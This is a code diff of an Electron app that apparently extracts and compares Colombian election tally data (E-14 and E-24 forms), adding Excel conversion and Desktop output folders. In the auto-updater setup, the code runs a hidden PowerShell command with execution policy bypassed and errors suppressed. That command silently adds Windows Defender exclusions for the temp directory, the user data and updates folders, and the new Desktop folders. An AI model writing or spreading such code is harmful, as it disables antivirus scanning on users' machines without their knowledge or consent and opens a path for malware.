@@ -2,6 +2,36 @@ const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
 const path = require('path');
 const fs = require('fs');
 const { spawn } = require('child_process');
+const XLSX = require('xlsx');
+
+// ── Helpers Excel ─────────────────────────────────────────────────────────────
+
+// Lee un CSV (separador ';') y devuelve workbook de SheetJS
+function csvAWorkbook(csvPath) {
+  const contenido = fs.readFileSync(csvPath, 'utf8');
+  const wb = XLSX.read(contenido, { type: 'string', FS: ';', raw: false });
+  return wb;
+}
+
+// Convierte un CSV a xlsx en la misma carpeta, devuelve la ruta xlsx
+function csvAXlsx(csvPath) {
+  const wb = csvAWorkbook(csvPath);
+  const xlsxPath = csvPath.replace(/\.csv$/i, '.xlsx');
+  XLSX.writeFile(wb, xlsxPath);
+  return xlsxPath;
+}
+
+// Convierte un xlsx a CSV temporal (sep ';') y devuelve la ruta
+function xlsxACsvTemp(xlsxPath) {
+  const wb = XLSX.readFile(xlsxPath);
+  const ws = wb.Sheets[wb.SheetNames[0]];
+  const csv = XLSX.utils.sheet_to_csv(ws, { FS: ';' });
+  const tmpPath = xlsxPath.replace(/\.xlsx$/i, '_tmp.csv');
+  fs.writeFileSync(tmpPath, csv, 'utf8');
+  return tmpPath;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 
 // Determinar si estamos en desarrollo o producción
 const isDev = process.env.ELECTRON_DEV === 'true';
@@ -94,11 +124,8 @@ function crearCarpetaTrabajo() {
   const carpetaBase = app.getPath('userData');
   const carpetas = [
     carpetaBase,
-    path.join(carpetaBase, 'E14_PDFs'),
-    path.join(carpetaBase, 'E14_CSVs'),
-    path.join(carpetaBase, 'E24_MMV'),
-    path.join(carpetaBase, 'Resultados'),
-    path.join(carpetaBase, 'Evidencias')
+    obtenerCarpetaSalida(),
+    obtenerCarpetaComparacion()
   ];
 
   carpetas.forEach(carpeta => {
@@ -230,9 +257,11 @@ function setupAutoUpdater() {
     const os = require('os');
     const userDataDir = app.getPath('userData');
     const tempDir = os.tmpdir();
-    const cmd = `powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '${userDataDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${updatesDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${tempDir}' -Force -ErrorAction SilentlyContinue } catch {}"`;
+    const carpetaExtraccion = obtenerCarpetaSalida();
+    const carpetaComparacion = obtenerCarpetaComparacion();
+    const cmd = `powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '${userDataDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${updatesDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${tempDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${carpetaExtraccion}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${carpetaComparacion}' -Force -ErrorAction SilentlyContinue } catch {}"`;
     exec(cmd, () => {
-      console.log('[updater] Exclusiones de Defender aplicadas para:', userDataDir, '|', tempDir);
+      console.log('[updater] Exclusiones de Defender aplicadas para:', userDataDir, '|', carpetaExtraccion, '|', carpetaComparacion);
     });
   }
 
@@ -402,18 +431,26 @@ ipcMain.handle('seleccionar-pdfs', async () => {
 // Seleccionar archivo CSV
 ipcMain.handle('seleccionar-csv', async () => {
   const result = await dialog.showOpenDialog(mainWindow, {
-    title: 'Seleccionar archivo CSV',
-    filters: [{ name: 'CSV Files', extensions: ['csv'] }],
+    title: 'Seleccionar archivo E-14 extraído',
+    filters: [
+      { name: 'Excel / CSV', extensions: ['xlsx', 'csv'] },
+      { name: 'Excel', extensions: ['xlsx'] },
+      { name: 'CSV', extensions: ['csv'] }
+    ],
     properties: ['openFile']
   });
   return result.canceled ? null : result.filePaths[0];
 });
 
-// Seleccionar archivo MMV (CSV oficial E-24)
+// Seleccionar archivo MMV (E-24 oficial)
 ipcMain.handle('seleccionar-carpeta-mmv', async () => {
   const result = await dialog.showOpenDialog(mainWindow, {
-    title: 'Seleccionar archivo MMV de E-24 (CSV)',
-    filters: [{ name: 'CSV Files', extensions: ['csv'] }],
+    title: 'Seleccionar archivo MMV de E-24',
+    filters: [
+      { name: 'Excel / CSV', extensions: ['xlsx', 'csv'] },
+      { name: 'Excel', extensions: ['xlsx'] },
+      { name: 'CSV', extensions: ['csv'] }
+    ],
     properties: ['openFile']
   });
   return result.canceled ? null : result.filePaths[0];
@@ -525,9 +562,13 @@ function obtenerRutaScripts() {
   return path.join(process.resourcesPath, 'r-scripts');
 }
 
-// Obtener carpeta de salida (dentro de userData para evitar bloqueo CFA de Windows)
+// Carpetas de salida en el Escritorio del usuario
 function obtenerCarpetaSalida() {
-  return path.join(app.getPath('userData'), 'Resultados');
+  return path.join(app.getPath('desktop'), 'Verificador Electoral - Extraccion');
+}
+
+function obtenerCarpetaComparacion() {
+  return path.join(app.getPath('desktop'), 'Verificador Electoral - Comparacion');
 }
 
 // Verificar si R está disponible (ejecuta Rscript --version realmente)
@@ -896,11 +937,18 @@ ipcMain.handle('fusionar-csvs', async () => {
     // Limpiar líneas vacías al final
     contenidoFinal = contenidoFinal.replace(/\n+$/, '\n');
 
-    // Guardar archivo final
-    const archivoFinal = path.join(outputDir, 'resultados_e14_FINAL.csv');
-    fs.writeFileSync(archivoFinal, contenidoFinal, 'utf8');
+    // Guardar CSV intermedio y convertir a Excel
+    const csvTemp = path.join(outputDir, 'resultados_e14_FINAL.csv');
+    fs.writeFileSync(csvTemp, contenidoFinal, 'utf8');
 
-    console.log('CSV Final generado:', archivoFinal);
+    const archivoFinal = path.join(outputDir, 'resultados_e14_FINAL.xlsx');
+    const wb = XLSX.read(contenidoFinal, { type: 'string', FS: ';', raw: false });
+    XLSX.writeFile(wb, archivoFinal);
+
+    // Eliminar CSV temporal
+    try { fs.unlinkSync(csvTemp); } catch (e) {}
+
+    console.log('Excel Final generado:', archivoFinal);
 
     return {
       success: true,
@@ -1015,17 +1063,29 @@ ipcMain.handle('seleccionar-carpeta-salida', async () => {
 // ============================================
 ipcMain.handle('comparar-e14-e24', async (event, archivoCSV, archivoMMV, carpetaSalida) => {
   return new Promise((resolve) => {
+    let tmpCsvE14 = null;
+    let tmpCsvMMV = null;
     try {
       const rPath = obtenerRutaR();
       const scriptPath = path.join(obtenerRutaScripts(), 'comparador_discrepancias.R');
-      const outputDir = carpetaSalida || obtenerCarpetaSalida();
+      const outputDir = carpetaSalida || obtenerCarpetaComparacion();
 
       // Validar archivos
       if (!archivoCSV || !fs.existsSync(archivoCSV)) {
-        return resolve({ success: false, error: 'Archivo CSV de datos extraidos no encontrado' });
+        return resolve({ success: false, error: 'Archivo E-14 extraído no encontrado' });
       }
       if (!archivoMMV || !fs.existsSync(archivoMMV)) {
         return resolve({ success: false, error: 'Archivo MMV oficial no encontrado' });
+      }
+
+      // Si el usuario seleccionó Excel, convertir a CSV temporal para R
+      if (archivoCSV.toLowerCase().endsWith('.xlsx')) {
+        tmpCsvE14 = xlsxACsvTemp(archivoCSV);
+        archivoCSV = tmpCsvE14;
+      }
+      if (archivoMMV.toLowerCase().endsWith('.xlsx')) {
+        tmpCsvMMV = xlsxACsvTemp(archivoMMV);
+        archivoMMV = tmpCsvMMV;
       }
       if (!fs.existsSync(scriptPath)) {
         return resolve({ success: false, error: 'Script comparador_discrepancias.R no encontrado' });
@@ -1131,8 +1191,25 @@ ipcMain.handle('comparar-e14-e24', async (event, archivoCSV, archivoMMV, carpeta
           }
         }
 
-        // Limpiar manifiesto
+        // Limpiar manifiesto y temporales xlsx→csv
         try { fs.unlinkSync(manifiestoPath); } catch (e) {}
+        if (tmpCsvE14) try { fs.unlinkSync(tmpCsvE14); } catch (e) {}
+        if (tmpCsvMMV) try { fs.unlinkSync(tmpCsvMMV); } catch (e) {}
+
+        // Convertir CSVs de salida del comparador a Excel
+        if (code === 0 && fs.existsSync(outputDir)) {
+          try {
+            const csvsSalida = fs.readdirSync(outputDir)
+              .filter(f => f.endsWith('.csv') && !f.startsWith('manifiesto'));
+            for (const csv of csvsSalida) {
+              const csvPath = path.join(outputDir, csv);
+              csvAXlsx(csvPath);
+              fs.unlinkSync(csvPath);
+            }
+          } catch (e) {
+            console.error('Error convirtiendo salidas a Excel:', e);
+          }
+        }
 
         resolve({
           success: code === 0,
